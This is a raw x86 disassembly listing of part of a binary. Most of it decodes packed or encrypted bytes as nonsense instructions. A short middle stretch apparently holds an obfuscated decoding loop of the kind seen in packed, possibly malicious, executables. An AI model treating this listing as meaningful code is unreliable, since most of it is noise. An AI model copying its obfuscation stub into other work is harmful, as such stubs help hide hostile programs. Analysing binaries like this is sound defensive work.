  40d971:	test   eax,0x50d61354
  40d977:	aam    0xd5
  40d979:	mov    bh,0xe4
  40d97b:	out    0xab,eax
  40d97d:	fmul   DWORD PTR [esi]
  40d97f:	pop    ebp
  40d980:	or     esi,DWORD PTR [esi-0x1bcd5ec6]
  40d986:	cmp    BYTE PTR [edi-0x35],ah
  40d989:	sub    ebp,DWORD PTR [edi+0x167c721e]
  40d98f:	shl    DWORD PTR [ecx+0x8],cl
  40d992:	fcomip st,st(1)
  40d994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d995:	es jmp 0x40d938
  40d998:	add    edx,DWORD PTR [ecx+esi*1]
  40d99b:	jne    0x40d998
  40d99d:	in     eax,dx
  40d99e:	lods   al,BYTE PTR ds:[esi]
  40d99f:	jecxz  0x40da1b
  40d9a1:	sahf   
  40d9a2:	dec    edi
  40d9a3:	jmp    0x1f46:0x282704b9
  40d9aa:	dec    ecx
  40d9ab:	push   esi
  40d9ac:	push   eax
  40d9ad:	add    DWORD PTR [edi+0x765ea76d],0x65
  40d9b4:	aam    0xae
  40d9b6:	jnp    0x40d9ac
  40d9b8:	jns    0x40d9ca
  40d9ba:	lds    ecx,FWORD PTR [eax-0x6]
  40d9bd:	pop    esp
  40d9be:	out    0x21,al
  40d9c0:	cmp    al,0xc9
  40d9c2:	imul   ebx,DWORD PTR [ebx-0x67371cbe],0xc991caa4
  40d9cc:	imul   cl
  40d9ce:	or     ecx,edi
  40d9d0:	mov    ecx,0xc1cc37cf
  40d9d5:	xlat   BYTE PTR ds:[ebx]
  40d9d6:	or     DWORD PTR [ecx+0x1a872c46],ebp
  40d9dc:	pop    eax
  40d9dd:	in     al,0x2c
  40d9df:	add    ebp,DWORD PTR [ecx-0x3ac9eaa6]
  40d9e5:	push   es
  40d9e6:	push   eax
  40d9e7:	adc    dh,BYTE PTR [ebx-0x327e867c]
  40d9ed:	or     DWORD PTR [esp+ebx*1],esp
  40d9f0:	push   cs
  40d9f1:	adc    edi,DWORD PTR [ecx]
  40d9f3:	fsubr  DWORD PTR [ecx]
  40d9f5:	loope  0x40d9dc
  40d9f7:	inc    eax
  40d9f8:	jns    0x40d9b9
  40d9fa:	push   esi
  40d9fb:	inc    ebx
  40d9fc:	aam    0xaf
  40d9fe:	xor    BYTE PTR [eax-0x7d],al
  40da01:	shl    BYTE PTR [ebx+0xad99ef3],1
  40da07:	adc    DWORD PTR ds:0x4d35a999,esi
  40da0d:	mov    esi,DWORD PTR [eax+0x76]
  40da10:	pop    eax
  40da11:	push   es
  40da12:	mov    BYTE PTR [edi-0x27a00ae0],bh
  40da18:	imul   ebx,ebp,0x2c
  40da1b:	xor    eax,0xa08fa59c
  40da20:	inc    eax
  40da21:	mov    cl,0x14
  40da23:	addr16 dec edx
  40da25:	in     eax,dx
  40da26:	test   al,0x81
  40da28:	gs inc edi
  40da2a:	mov    eax,ds:0xa446cf82
  40da2f:	test   dl,0xb4
  40da32:	pop    edi
  40da33:	sub    al,0x4d
  40da35:	mov    ss,WORD PTR [ebx]
  40da37:	ror    DWORD PTR [esp+ecx*1],1
  40da3a:	xchg   esp,eax
  40da3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da3c:	xor    eax,0xc2816ab
  40da41:	adc    DWORD PTR [esi],esi
  40da43:	cs xchg edx,eax
  40da45:	add    dl,BYTE PTR es:[esi]
  40da48:	xchg   ebp,eax
  40da49:	ins    BYTE PTR es:[edi],dx
  40da4a:	in     al,0x72
  40da4c:	push   ebp
  40da4d:	mov    ds:0x698cfddd,al
  40da52:	jecxz  0x40da35
  40da54:	xor    BYTE PTR [edi-0x239d8c91],dh
  40da5a:	jns    0x40da6a
  40da5c:	jmp    0x40da79
  40da5e:	add    esp,DWORD PTR ds:0xfbf21c96
  40da64:	in     eax,dx
  40da65:	jge    0x40da71
  40da67:	add    DWORD PTR [ebx+0x59a44f1b],ebp
  40da6d:	gs in  eax,0x21
  40da70:	popa   
  40da71:	cmp    bl,BYTE PTR [ebp+0xeea0ce2]
  40da77:	lock pop ebx
  40da79:	jmp    0x5b5bb536
  40da7e:	(bad)  
  40da80:	nop
  40da81:	xchg   BYTE PTR [edi+0x4b094658],bh
  40da87:	iret   
  40da88:	cmp    al,0x3d
  40da8a:	inc    eax
  40da8b:	push   esp
  40da8c:	add    ah,BYTE PTR [ecx]
  40da8e:	fwait
  40da8f:	add    edi,DWORD PTR [ecx]
  40da91:	xchg   esp,eax
  40da92:	imul   ebp,DWORD PTR [edx],0x358b21eb
  40da98:	adc    ch,0x2b
  40da9b:	(bad)  
  40da9c:	cmp    ebx,ebp
  40da9e:	sub    esi,DWORD PTR [ebx]
  40daa0:	pop    ss
  40daa1:	lods   eax,DWORD PTR ds:[esi]
  40daa2:	mov    cl,dh
  40daa4:	sbb    ah,BYTE PTR fs:[eax-0x9]
  40daa8:	std    
  40daa9:	push   eax
  40daaa:	mov    ds:0xd193fc13,eax
  40daaf:	xor    dl,BYTE PTR [ebx+0x77]
  40dab2:	(bad)  
  40dab3:	fdivp  st(4),st
  40dab5:	hlt    
  40dab6:	adc    ch,BYTE PTR [esi+0x12be0543]
  40dabc:	mov    al,0x60
  40dabe:	jecxz  0x40dae3
  40dac0:	dec    eax
  40dac1:	mov    ebx,0xf62e14cc
  40dac6:	mov    DWORD PTR [esp+ebx*2+0x7f8a3a5c],edi
  40dacd:	dec    esi
  40dace:	jmp    0xe33d:0x5c39a19
  40dad5:	push   ebx
  40dad6:	mov    eax,ds:0x496ad07a
  40dadb:	mov    al,0xc8
  40dadd:	xchg   DWORD PTR fs:[eax+edx*1+0x740252d7],edx
  40dae5:	cmp    al,0x46
  40dae7:	inc    ebx
  40dae8:	loop   0x40dae8
  40daea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daeb:	scas   al,BYTE PTR es:[edi]
  40daec:	pushf  
  40daed:	xor    ecx,esi
  40daef:	mov    ecx,0x2d6c5a80
  40daf4:	jp     0x40db5f
  40daf6:	sbb    BYTE PTR [edi-0x19],ch
  40daf9:	adc    ah,dl
  40dafb:	stos   BYTE PTR es:[edi],al
  40dafc:	outs   dx,BYTE PTR ds:[esi]
  40dafd:	sbb    ebp,DWORD PTR [edx-0x53]
  40db00:	lods   al,BYTE PTR ds:[esi]
  40db01:	sub    eax,0xe4fbc8c3
  40db06:	fild   WORD PTR [eax+eax*1+0x867e5a9]
  40db0d:	pop    ecx
  40db0e:	inc    eax
  40db0f:	pop    esp
  40db10:	jbe    0x40dad9
  40db12:	jo     0x40db00
  40db14:	js     0x40db32
  40db16:	out    0x57,al
  40db18:	push   cs
  40db19:	cld    
  40db1a:	and    BYTE PTR ss:[edi],ch
  40db1d:	sar    dl,1
  40db1f:	dec    ebx
  40db20:	mov    edx,0x1b0e4fd2
  40db25:	cld    
  40db26:	loopne 0x40dacd
  40db28:	mov    ch,0x77
  40db2a:	or     BYTE PTR [eax],al
  40db2c:	repnz sub eax,0x7a8f6cba
  40db32:	das    
  40db33:	pop    ds
  40db34:	(bad)  [eax]
  40db36:	cmp    ebp,ebp
  40db38:	mov    esp,0x502dcbd4
  40db3d:	out    dx,al
  40db3e:	dec    edx
  40db3f:	mov    bl,0x58
  40db41:	ret    0x4b6a
  40db44:	cmp    edx,DWORD PTR [ebx-0x7e7bcf75]
  40db4a:	push   ds
  40db4b:	inc    eax
  40db4c:	mov    edx,0xab188b5c
  40db51:	push   esi
  40db52:	jnp    0x40db12
  40db54:	adc    eax,0x9332ab84
  40db59:	mov    dl,0xed
  40db5b:	mov    dl,0xa2
  40db5d:	(bad)  
  40db5e:	pop    edi
  40db5f:	loope  0x40db7f
  40db61:	jmp    0x40db73
  40db63:	(bad)  
  40db64:	jp     0x40dafd
  40db66:	sahf   
  40db67:	fst    DWORD PTR [edi-0x52742f6]
  40db6d:	mov    ah,0x79
  40db6f:	mov    bl,0x2e
  40db71:	dec    edx
  40db72:	in     al,dx
  40db73:	ins    DWORD PTR es:[edi],dx
  40db74:	pop    esi
  40db75:	gs gs xchg esp,eax
  40db78:	sub    ah,ch
  40db7a:	xlat   BYTE PTR ds:[ebx]
  40db7b:	iret   
  40db7c:	or     BYTE PTR [ecx+0x3eb721ba],cl
  40db82:	mov    eax,0xb5280d37
  40db87:	scas   eax,DWORD PTR es:[edi]
  40db88:	in     eax,0x7f
  40db8a:	lds    ecx,FWORD PTR [bp+di]
  40db8d:	mov    DWORD PTR [esi],edi
  40db8f:	int3   
  40db90:	jecxz  0x40db9c
  40db92:	jne    0x40dbf0
  40db94:	imul   ecx,DWORD PTR [ebx],0x9
  40db97:	push   esp
  40db98:	(bad)  
  40db99:	in     eax,dx
  40db9a:	enter  0xa7e9,0x17
  40db9e:	dec    ebx
  40db9f:	lds    edx,FWORD PTR [esi-0x592b9cb7]
  40dba5:	popa   
  40dba6:	sub    BYTE PTR [eax],cl
  40dba8:	loopne 0x40dbc1
  40dbaa:	mov    bh,0xde
  40dbac:	jbe    0x40dc0d
  40dbae:	shl    DWORD PTR [ecx+0x7c],0x2d
  40dbb2:	sar    bh,1
  40dbb4:	mov    al,0xef
  40dbb6:	add    cl,BYTE PTR [ebx]
  40dbb8:	push   ds
  40dbb9:	pop    ebx
  40dbba:	jnp    0x40dbfa
  40dbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbbd:	xchg   edx,eax
  40dbbe:	or     DWORD PTR [edi],0x1f
  40dbc1:	mov    esi,0x5a36517f
  40dbc6:	jno    0x40dbe8
  40dbc8:	or     esi,DWORD PTR [ecx+ecx*2+0x41]
  40dbcc:	xor    DWORD PTR [eax+0x1d7d1d73],0x2f
  40dbd3:	cmp    al,0x27
  40dbd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd6:	stc    
  40dbd7:	push   ebx
  40dbd8:	cli    
  40dbd9:	ror    BYTE PTR [eax+0xa],0xa0
  40dbdd:	xchg   esp,eax
  40dbde:	and    BYTE PTR [esi+0x15],ch
  40dbe1:	les    edx,FWORD PTR [edx+0x19a0e1e0]
  40dbe7:	mov    ch,BYTE PTR [eax+0x5a]
  40dbea:	popf   
  40dbeb:	xchg   esi,eax
  40dbec:	pusha  
  40dbed:	rol    ch,1
  40dbef:	cs xchg ebp,eax
  40dbf1:	xchg   esi,eax
  40dbf2:	cmp    al,BYTE PTR [ebx-0x22ba1fd7]
  40dbf8:	ds loop 0x40db7e
  40dbfb:	ret    0xf545
  40dbfe:	xor    DWORD PTR [ecx-0x5a],esi
  40dc01:	fcom   st(7)
  40dc03:	inc    ebp
  40dc04:	lahf   
  40dc05:	ins    BYTE PTR es:[edi],dx
  40dc06:	lods   al,BYTE PTR ds:[esi]
  40dc07:	adc    al,0x62
  40dc09:	mov    edi,0xbb0982ec
  40dc0e:	popf   
  40dc0f:	or     esp,DWORD PTR [ebx-0x6]
  40dc12:	or     DWORD PTR [ebp+ebx*2+0x56],esp
  40dc16:	iret   
  40dc17:	aam    0xb2
  40dc19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc1a:	add    eax,0xf76740a5
  40dc1f:	jmp    0x40dc2e
  40dc21:	aad    0xb
  40dc23:	sub    al,0xb8
  40dc25:	add    al,0x11
  40dc27:	fidivr DWORD PTR [di]
  40dc2a:	push   cs
  40dc2b:	fs loopne 0x40dc7b
  40dc2e:	in     eax,dx
  40dc2f:	pop    es
  40dc30:	adc    dh,BYTE PTR [ebx]
  40dc32:	pop    esi
  40dc33:	adc    BYTE PTR [ebp-0x4aba569a],ah
  40dc39:	outs   dx,DWORD PTR ds:[esi]
  40dc3a:	rcr    BYTE PTR [ecx],0xaa
  40dc3d:	inc    ebp
  40dc3e:	jns    0x40dc9d
  40dc40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc41:	pop    ds
  40dc42:	inc    eax
  40dc43:	test   eax,0xc029ec93
  40dc48:	xchg   BYTE PTR [eax-0x34],cl
  40dc4b:	mov    eax,0x21b9f6b1
  40dc50:	or     eax,0x7296b038
  40dc55:	fidivr DWORD PTR [ebx-0x156f6f82]
  40dc5b:	popa   
  40dc5c:	pop    eax
  40dc5d:	test   al,0xa
  40dc5f:	pop    ebp
  40dc60:	inc    edx
  40dc61:	mov    dl,dl
  40dc63:	sub    ah,bh
  40dc65:	push   ds
  40dc66:	dec    edx
  40dc67:	sub    edi,esi
  40dc69:	stos   BYTE PTR es:[edi],al
  40dc6a:	mul    dl
  40dc6c:	popfw  
  40dc6e:	xchg   bl,dl
  40dc70:	pop    ss
  40dc71:	ds mov bl,0x35
  40dc74:	dec    eax
  40dc75:	mov    eax,0x85c8aa47
  40dc7a:	sbb    BYTE PTR [esi+ebx*1+0x6d],cl
  40dc7e:	inc    ebp
  40dc7f:	adc    ecx,eax
  40dc81:	sub    al,0x59
  40dc83:	adc    DWORD PTR [esi+0x4cd012f2],0xffffffa7
  40dc8a:	and    edi,eax
  40dc8c:	mov    edi,DWORD PTR [ebx+0x5a10b3c0]
  40dc92:	adc    al,0x41
  40dc94:	fwait
  40dc95:	mov    ah,BYTE PTR [ecx-0x6f5191b]
  40dc9b:	outs   dx,BYTE PTR ds:[esi]
  40dc9c:	ins    DWORD PTR es:[edi],dx
  40dc9d:	dec    ebp
  40dc9e:	dec    edi
  40dc9f:	sti    
  40dca0:	cmp    eax,0x38c0634b
  40dca5:	in     al,0x81
  40dca7:	sub    eax,0x87f140d9
  40dcac:	icebp  
  40dcad:	mov    cl,0xe3
  40dcaf:	stos   BYTE PTR es:[edi],al
  40dcb0:	aaa    
  40dcb1:	sub    al,0x89
  40dcb3:	retf   
  40dcb4:	sub    eax,0x154862fe
  40dcb9:	lods   eax,DWORD PTR ds:[esi]
  40dcba:	cwde   
  40dcbb:	cmp    edi,ebp
  40dcbd:	stc    
  40dcbe:	nop
  40dcbf:	leave  
  40dcc0:	ds sti 
  40dcc2:	hlt    
  40dcc3:	in     eax,0x5a
  40dcc5:	mov    eax,0x22da9d0e
  40dcca:	inc    edi
  40dccb:	in     al,0x5f
  40dccd:	dec    eax
  40dccf:	jae    0x40dd37
  40dcd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcd2:	mov    edi,0x287e8db2
  40dcd7:	idiv   BYTE PTR [eax+0x3c]
  40dcda:	jl     0x40dd11
  40dcdc:	imul   ecx,eax,0x631ce415
  40dce2:	pop    ebp
  40dce3:	fdivr  QWORD PTR [edx+0x5cd0d210]
  40dce9:	div    BYTE PTR [ebp-0x1c]
  40dcec:	scas   eax,DWORD PTR es:[edi]
  40dced:	xor    BYTE PTR [esi+0xc],bl
  40dcf0:	inc    edi
  40dcf1:	loopne 0x40dd57
  40dcf3:	mov    eax,edi
  40dcf5:	aad    0xfd
  40dcf7:	pop    esp
  40dcf8:	test   al,0x9e
  40dcfa:	lods   eax,DWORD PTR ds:[esi]
  40dcfb:	mov    dh,0x10
  40dcfd:	push   0xf8a12df8
  40dd02:	xchg   edi,eax
  40dd03:	and    al,0xce
  40dd05:	jno    0x40dd54
  40dd07:	mov    eax,0x7d0737f3
  40dd0c:	dec    ecx
  40dd0d:	inc    edi
  40dd0e:	lods   al,BYTE PTR ds:[esi]
  40dd0f:	cwde   
  40dd10:	adc    eax,0xb4ba2489
  40dd15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd16:	xor    al,0x4a
  40dd18:	dec    ecx
  40dd19:	int    0x8c
  40dd1b:	ins    DWORD PTR es:[edi],dx
  40dd1c:	mov    bh,0xe2
  40dd1e:	xchg   ebp,eax
  40dd1f:	and    eax,DWORD PTR [edi-0x76]
  40dd22:	ins    DWORD PTR es:[edi],dx
  40dd23:	dec    ecx
  40dd24:	cli    
  40dd25:	push   0xfffffffd
  40dd27:	mov    eax,edx
  40dd29:	retf   0x8782
  40dd2c:	jae    0x40dd26
  40dd2e:	rcl    DWORD PTR [esi+0x1],cl
  40dd31:	out    dx,eax
  40dd32:	lds    ebx,FWORD PTR [edi-0x457fa06f]
  40dd38:	jo     0x40dd87
  40dd3a:	fst    QWORD PTR [esi-0x74ef499]
  40dd40:	mov    bl,0xbf
  40dd42:	retf   
  40dd43:	nop
  40dd44:	mov    edx,0x97ee0f43
  40dd49:	xchg   dh,dl
  40dd4b:	dec    ebp
  40dd4c:	addr16 jo 0x40dd89
  40dd4f:	mov    ebx,0x2d409c56
  40dd54:	shl    DWORD PTR [ecx-0x620e0098],0x92
  40dd5b:	xchg   BYTE PTR [edx+0x572190c8],dh
  40dd61:	(bad)  
  40dd62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd63:	or     eax,0xc456c34a
  40dd68:	inc    edi
  40dd69:	(bad)  
  40dd6b:	into   
  40dd6c:	inc    ecx
  40dd6d:	sub    BYTE PTR [esi+0x3d],ah
  40dd70:	popf   
  40dd71:	gs stc 
  40dd73:	dec    eax
  40dd74:	jmp    0x40dd2f
  40dd76:	or     BYTE PTR [edx+0x2b],bl
  40dd79:	int    0xb0
  40dd7b:	mov    ds:0x20c763a7,al
  40dd80:	push   ss
  40dd81:	sar    BYTE PTR [eax],1
  40dd83:	pop    ss
  40dd84:	sub    al,0x97
  40dd86:	(bad)  
  40dd87:	repnz or al,0x17
  40dd8a:	and    eax,0x8519445
  40dd8f:	or     al,0xa3
  40dd91:	jg     0x40ddc3
  40dd93:	pavgw  mm1,mm1
  40dd96:	mov    ebx,0xbddc1791
  40dd9b:	daa    
  40dd9c:	pop    edi
  40dd9d:	jl     0x40dd86
  40dd9f:	lahf   
  40dda0:	lods   eax,DWORD PTR ds:[esi]
  40dda1:	add    eax,DWORD PTR cs:[edi]
  40dda4:	mov    edi,0xe8a7416
  40dda9:	ret    
  40ddaa:	add    BYTE PTR [ecx+ecx*2-0x4c],ah
  40ddae:	repz mov eax,0xd9d617c4
  40ddb4:	lahf   
  40ddb5:	and    edx,DWORD PTR [esi+0x3b]
  40ddb8:	xchg   esi,eax
  40ddb9:	pop    edx
  40ddba:	fisub  DWORD PTR [esi]
  40ddbc:	mov    edx,0xf79835c0
  40ddc1:	push   ebp
  40ddc2:	addr16 pop esp
  40ddc4:	in     al,dx
  40ddc5:	ins    BYTE PTR es:[edi],dx
  40ddc6:	cmp    dh,BYTE PTR [eax+0x8]
  40ddc9:	mov    al,ds:0x31da859c
  40ddce:	call   0xaeb79740
  40ddd3:	inc    ebx
  40ddd4:	fadd   st,st(4)
  40ddd6:	inc    edx
  40ddd7:	popa   
  40ddd8:	push   0x69
  40ddda:	lock sub BYTE PTR [ebx+0x28],ah
  40ddde:	loope  0x40dd81
  40dde0:	inc    esp
  40dde1:	jle    0x40dd82
  40dde3:	jbe    0x40de14
  40dde5:	jle    0x40de3f
  40dde7:	nop
  40dde8:	mov    dl,0x52
  40ddea:	cld    
  40ddeb:	pop    ebp
  40ddec:	daa    
  40dded:	fs push ebx
  40ddef:	xchg   edx,eax
  40ddf0:	pusha  
  40ddf1:	lock div BYTE PTR [edi]
  40ddf4:	jns    0x40de58
  40ddf6:	add    ch,0x9e
  40ddf9:	fcomp  QWORD PTR [ebx-0x74]
  40ddfc:	mov    bl,BYTE PTR [ebx]
  40ddfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddff:	jae    0x40ddb7
  40de01:	mov    ds:0x85e4e789,eax
  40de06:	bound  eax,QWORD PTR [ebp-0x251a011e]
  40de0c:	sub    DWORD PTR [esi-0x735c2df9],ebx
  40de12:	lods   eax,DWORD PTR ds:[esi]
  40de13:	rcr    BYTE PTR [edx+ebp*2],cl
  40de16:	pop    ss
  40de17:	xlat   BYTE PTR ds:[ebx]
  40de18:	in     al,0x2
  40de1a:	loopne 0x40de00
  40de1c:	(bad)  
  40de1d:	dec    edi
  40de1e:	scas   al,BYTE PTR es:[edi]
  40de1f:	mov    ah,0x5e
  40de21:	push   cs
  40de22:	cwde   
  40de23:	sbb    DWORD PTR [ecx],0x5f
  40de26:	arpl   WORD PTR [ebx],si
  40de28:	push   es
  40de29:	pusha  
  40de2a:	loop   0x40de8b
  40de2c:	push   esi
  40de2d:	inc    esp
  40de2e:	or     al,bl
  40de30:	aaa    
  40de31:	cmp    eax,DWORD PTR [ecx]
  40de33:	jp     0x40de24
  40de35:	pop    es
  40de36:	arpl   WORD PTR [esi-0x20801207],di
  40de3c:	jns    0x40de50
  40de3e:	and    edx,DWORD PTR [esi]
  40de40:	sbb    DWORD PTR ds:0xe1680f32,0x52
  40de47:	mov    edi,0x229a6147
  40de4c:	cmp    eax,0x8bb38481
  40de51:	inc    ebp
  40de52:	cld    
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x4a
  40dfd4:	jb     0x40e010
  40dfd6:	push   ecx
  40dfd7:	(bad)
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x1c]
  40dfe0:	dec    edi
  40dfe1:	dec    edi
  40dfe2:	xor    eax,0x5b6a3d19
  40dfe7:	rol    DWORD PTR [ebp+0x4fa39cde],0x7e
  40dfee:	push   cs
  40dfef:	pop    ebp
  40dff0:	jmp    0x40e04b
  40dff2:	gs dec esi
  40dff4:	push   esp
  40dff5:	sub    ebp,edi
  40dff7:	outs   dx,DWORD PTR ds:[esi]
  40dff8:	jp     0x40e04f
  40dffa:	fcmovu st,st(5)
  40dffc:	push   esi
  40dffd:	ror    BYTE PTR [ebx],0x10
  40e000:	popa   
  40e001:	sar    DWORD PTR [edi+0x3b603f93],cl
  40e007:	fistp  DWORD PTR [edi-0x68]
  40e00a:	test   BYTE PTR [esi-0x3],bh
  40e00d:	pop    esp
  40e00e:	scas   eax,DWORD PTR es:[edi]
  40e00f:	and    BYTE PTR [ebx-0x78],dl
  40e012:	ds jb  0x40dfc1
  40e015:	add    eax,0x293eee6c
  40e01a:	pop    ss
  40e01b:	clc    
  40e01c:	mov    cl,ch
  40e01e:	jno    0x40e05c
  40e020:	inc    eax
  40e021:	xchg   esp,ebx
  40e023:	inc    esi
  40e024:	sbb    al,0x56
  40e026:	sbb    edi,DWORD PTR [esi+0x7746af32]
  40e02c:	call   0xccf4:0x4b4580bb
  40e033:	mov    edi,0x48fb6bdc
  40e038:	test   DWORD PTR [eax],edx
  40e03a:	and    dl,BYTE PTR [eax]
  40e03c:	ret    0x372e
  40e03f:	in     al,0x2b
  40e041:	fst    QWORD PTR [edi-0x7f]
  40e044:	dec    ecx
  40e045:	push   ecx
  40e046:	sbb    eax,0x9ee89748
  40e04b:	adc    al,0xc5
  40e04d:	test   BYTE PTR [edx+0x53],bh
  40e050:	pop    edi
  40e051:	push   eax
  40e052:	outs   dx,DWORD PTR ds:[esi]
  40e053:	mov    esp,0x5d5bb86d
  40e058:	outs   dx,DWORD PTR ds:[esi]
  40e059:	jb     0x40e0ac
  40e05b:	leave  
  40e05c:	(bad)  
  40e05d:	push   eax
  40e05e:	sti    
  40e05f:	in     al,0x65
  40e061:	xchg   ecx,eax
  40e062:	lea    ebx,[ecx+0x5d2e7b39]
  40e068:	mov    bl,0x52
  40e06a:	rcr    DWORD PTR [ebx+0x51],0x60
  40e06e:	adc    al,0x55
  40e070:	push   DWORD PTR [edi]
  40e072:	cmp    eax,0xf93886d8
  40e077:	mov    edx,0x23002155
  40e07c:	outs   dx,DWORD PTR ds:[esi]
  40e07d:	test   al,0x9a
  40e07f:	add    esi,esi
  40e081:	pop    ebx
  40e082:	(bad)  
  40e083:	and    DWORD PTR [edx+edx*8+0x47],ebx
  40e087:	retf   0x188d
  40e08a:	iret   
  40e08b:	mov    ds:0x96b633ca,al
  40e090:	adc    DWORD PTR [edx+0x2b],esp
  40e093:	ins    BYTE PTR es:[edi],dx
  40e094:	gs loope 0x40e06e
  40e097:	lods   eax,DWORD PTR ds:[esi]
  40e098:	(bad)  
  40e099:	or     eax,0xfea09e4b
  40e09e:	pop    esi
  40e09f:	addr16 xchg dl,ah
  40e0a2:	mov    dh,0x7f
  40e0a4:	and    al,BYTE PTR [esi]
  40e0a6:	scas   al,BYTE PTR es:[edi]
  40e0a7:	js     0x40e118
  40e0a9:	loopne 0x40e073
  40e0ab:	adc    al,0xf9
  40e0ad:	jbe    0x40e051
  40e0af:	xchg   ebx,eax
  40e0b0:	mov    bl,0x84
  40e0b2:	sbb    ch,BYTE PTR [edx+0x78382e08]
  40e0b8:	jl     0x40e0a4
  40e0ba:	shl    esp,0xcf
  40e0bd:	cmc    
  40e0be:	je     0x40e05c
  40e0c0:	or     al,0x9
  40e0c2:	dec    edi
  40e0c3:	adc    al,0x80
  40e0c5:	mov    edx,0x8de49d
  40e0ca:	mov    bh,0xb9
  40e0cc:	ffreep st(1)
  40e0ce:	xchg   edi,eax
  40e0cf:	xchg   ebp,eax
  40e0d0:	mov    edi,0x56c89d5
  40e0d5:	and    eax,0x5f2b1c6
  40e0da:	push   0xffffffde
  40e0dc:	je     0x40e15a
  40e0de:	mov    ecx,0xd7337aa3
  40e0e3:	inc    ebp
  40e0e4:	loopne 0x40e117
  40e0e6:	and    edi,edi
  40e0e8:	jmp    0xe73a1120
  40e0ed:	test   al,0x6b
  40e0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0f0:	inc    esp
  40e0f1:	push   ds
  40e0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
